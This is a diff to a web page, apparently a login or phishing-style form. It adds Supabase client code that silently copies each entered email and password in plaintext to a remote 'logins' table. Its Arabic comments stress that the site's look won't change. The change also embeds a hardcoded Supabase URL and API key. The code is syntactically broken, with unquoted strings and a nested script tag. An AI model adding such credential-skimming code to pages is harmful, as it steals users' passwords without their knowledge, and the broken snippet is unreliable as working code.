@@ -205,7 +205,30 @@
                     document.getElementById('successScreen').classList.add('active');
                 }, 50);
             }, 600);
-        });
+        }); 
+        <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+    // غير دول بتوعك من Supabase
+    const supabaseUrl = https://hiechkwuygvtvhqtrrgo.supabase.co
+    const supabaseKey = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhpZWNoa3d1eWd2dHZocXRycmdvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc0NzA5MjUsImV4cCI6MjA4MzA0NjkyNX0.R38sUaIhzkem7L1kmGRZbG7c7ABBCYTdxzfv5bdyRRw
+
+    const supabase = Supabase.createClient(supabaseUrl, supabaseKey);
+
+    // إضافة للحفظ في قاعدة البيانات المركزية (مش هتغير شكل الموقع)
+    async function saveToSupabase(email, password) {
+        const { error } = await supabase
+            .from('logins')
+            .insert({ email: email, password: password });
+    }
+
+    // عدل الدالة saveData القديمة عشان تحفظ في السيرفر كمان
+    const oldSaveData = saveData;
+    saveData = function(email, password) {
+        oldSaveData(email, password); // الحفظ المحلي القديم
+        saveToSupabase(email, password); // الحفظ في السيرفر المركزي
+    };
+</script>
     </script>
 </body>
 </html>
+
